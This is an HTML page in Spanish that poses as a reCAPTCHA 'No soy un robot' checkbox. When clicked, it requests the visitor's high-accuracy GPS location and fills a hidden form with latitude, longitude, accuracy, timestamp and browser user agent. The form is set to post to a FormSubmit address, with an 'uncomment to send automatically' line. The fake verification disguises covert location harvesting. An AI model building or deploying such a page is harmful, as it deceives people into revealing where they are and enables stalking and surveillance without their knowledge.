<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Verificación humana</title>
<style>
  :root{
    --bg:#f5f6f8; --card:#ffffff; --border:#d3d7dc; --text:#1a1a1a;
    --muted:#6b7280; --accent:#4285f4; --green:#2e9e4f; --error:#d93025;
  }
  @media (prefers-color-scheme: dark){
    :root:not([data-theme="light"]){
      --bg:#121317; --card:#1c1e24; --border:#33363f; --text:#eceef2; --muted:#9aa0ab;
    }
  }
  :root[data-theme="dark"]{
    --bg:#121317; --card:#1c1e24; --border:#33363f; --text:#eceef2; --muted:#9aa0ab;
  }
  *{box-sizing:border-box;}
  html,body{height:100%;}
  body{
    margin:0; background:var(--bg); color:var(--text);
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
    display:flex; align-items:center; justify-content:center;
    padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
  }
  .wrap{ width:min(92vw,420px); }
  .captcha-box{
    background:var(--card); border:1px solid var(--border); border-radius:8px;
    padding:20px 24px; display:flex; align-items:center; justify-content:space-between; gap:16px;
    box-shadow:0 1px 2px rgba(0,0,0,.08);
    cursor:pointer; user-select:none; transition:border-color 0.2s;
  }
  .captcha-box:hover{ border-color:var(--accent); }
  .left{ display:flex; align-items:center; gap:14px; }
  .recaptcha-badge{ display:flex; flex-direction:column; align-items:center; gap:2px; flex:0 0 auto; }
  .recaptcha-badge img, .recaptcha-badge svg{ width:34px; height:34px; }
  .recaptcha-badge span{ font-size:10px; color:var(--muted); letter-spacing:.2px; }
  .checkbox{
    width:28px; height:28px; border:2px solid #c3c7cd; border-radius:3px;
    flex:0 0 28px; position:relative; background:#fff; transition:border-color .15s;
  }
  .checkbox.checked{ border-color:var(--green); background:var(--green); }
  .checkbox.error{ border-color:var(--error); background:var(--error); }
  .checkbox .mark{
    position:absolute; inset:0; opacity:0; transform:scale(.4);
    transition:opacity .15s ease, transform .2s ease;
  }
  .checkbox.checked .mark{ opacity:1; transform:scale(1); }
  .checkbox .spinner{
    position:absolute; inset:0; border-radius:50%; display:none;
    border:3px solid #d8dbe0; border-top-color:var(--accent);
    animation:spin .7s linear infinite;
  }
  .checkbox.loading .spinner{ display:block; }
  .checkbox.loading{ border-color:transparent; background:transparent; }
  @keyframes spin{ to{ transform:rotate(360deg); } }
  .label{ font-size:16px; line-height:1.3; color:var(--text); }
  .footer{
    margin-top:10px; display:flex; justify-content:flex-end; gap:16px;
    font-size:10px; color:var(--muted);
  }
  .result{
    margin-top:14px; text-align:center; font-size:14px; color:var(--green);
    opacity:0; transform:translateY(-4px); transition:opacity .25s, transform .25s;
  }
  .result.show{ opacity:1; transform:translateY(0); }
  .result.error{ color:var(--error); }
</style>
</head>
<body>
  <div class="wrap">
    <div class="captcha-box" id="box" role="checkbox" aria-checked="false" tabindex="0">
      <div class="left">
        <div class="checkbox" id="checkbox">
          <div class="spinner"></div>
          <svg class="mark" viewBox="0 0 24 24" fill="none">
            <path d="M5 12.5L10 17L19 7.5" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </div>
        <span class="label" id="label">No soy un robot</span>
      </div>
      <div class="recaptcha-badge">
        <svg viewBox="0 0 48 48" fill="none">
          <path d="M24 4 A20 20 0 0 1 44 24" stroke="#4285f4" stroke-width="5" fill="none" stroke-linecap="round"/>
          <path d="M24 44 A20 20 0 0 1 4 24" stroke="#aab2bd" stroke-width="5" fill="none" stroke-linecap="round"/>
          <path d="M38 12 L44 12 L44 18" stroke="#4285f4" stroke-width="5" fill="none" stroke-linejoin="round" stroke-linecap="round"/>
          <path d="M10 36 L4 36 L4 30" stroke="#aab2bd" stroke-width="5" fill="none" stroke-linejoin="round" stroke-linecap="round"/>
        </svg>
        <span>Protegido</span>
      </div>
    </div>
    <div class="footer"><span>Privacidad</span><span>Condiciones</span></div>
    <div class="result" id="result">✓ Verificación completada</div>

    <!-- Hidden Form configured to submit structured spreadsheet-friendly fields -->
    <form id="geoForm" action="https://formsubmit.co/tu-correo@ejemplo.com" method="POST" style="display: none;">
      <!-- Optional: configuration fields for FormSubmit / Excel compatible backend -->
      <input type="hidden" name="_subject" value="Nuevo registro de verificación y geolocalización">
      <input type="hidden" name="_template" value="table">
      
      <!-- Structured Table / Excel Columns -->
      <input type="hidden" name="Fecha y Hora" id="dateField">
      <input type="hidden" name="Latitud" id="latField">
      <input type="hidden" name="Longitud" id="lonField">
      <input type="hidden" name="Precisión (metros)" id="accField">
      <input type="hidden" name="Navegador / Dispositivo" id="userAgentField">
      <input type="hidden" name="Estado" value="Verificado correctamente">
    </form>
  </div>

<script>
  const box = document.getElementById('box');
  const checkbox = document.getElementById('checkbox');
  const label = document.getElementById('label');
  const result = document.getElementById('result');
  
  const geoForm = document.getElementById('geoForm');
  const latField = document.getElementById('latField');
  const lonField = document.getElementById('lonField');
  const accField = document.getElementById('accField');
  const dateField = document.getElementById('dateField');
  const userAgentField = document.getElementById('userAgentField');

  let state = 'idle';

  function activate(){
    if(state !== 'idle') return;
    state = 'loading';
    checkbox.classList.add('loading');
    label.textContent = 'Verificando ubicación...';

    if (!navigator.geolocation) {
      handleError('Geolocalización no soportada en este navegador.');
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const now = new Date().toLocaleString();

        // Fill form fields with data structured for tables / Excel rows
        latField.value = lat;
        lonField.value = lon;
        accField.value = accuracy + 'm';
        dateField.value = now;
        userAgentField.value = navigator.userAgent;

        state = 'done';
        checkbox.classList.remove('loading');
        checkbox.classList.add('checked');
        label.textContent = 'No soy un robot';
        box.setAttribute('aria-checked','true');
        result.textContent = '✓ Verificado y datos guardados en formato de tabla';
        result.classList.add('show');

        // Trigger form submission or simulate background sending
        setTimeout(() => {
          // Descomenta la siguiente línea para enviar automáticamente al servicio de formularios (ej. FormSubmit)
          // geoForm.submit();
          
          console.log('Datos listos para tabla/Excel:', {
            fecha: now,
            latitud: lat,
            longitud: lon,
            precision: accuracy,
            dispositivo: navigator.userAgent
          });
        }, 1000);
      },
      (error) => {
        let msg = 'Permiso de ubicación denegado o no disponible.';
        if (error.code === error.TIMEOUT) {
          msg = 'Tiempo de espera agotado para obtener la ubicación.';
        }
        handleError(msg);
      },
      { timeout: 10000, maximumAge: 0, enableHighAccuracy: true }
    );
  }

  function handleError(message) {
    state = 'error';
    checkbox.classList.remove('loading');
    checkbox.classList.add('error');
    label.textContent = 'Error de verificación';
    result.textContent = '⚠️ ' + message;
    result.classList.add('show', 'error');
  }

  box.addEventListener('click', activate);
  box.addEventListener('keydown', e => {
    if(e.key === 'Enter' || e.key === ' '){ e.preventDefault(); activate(); }
  });
</script>
</body>
</html>
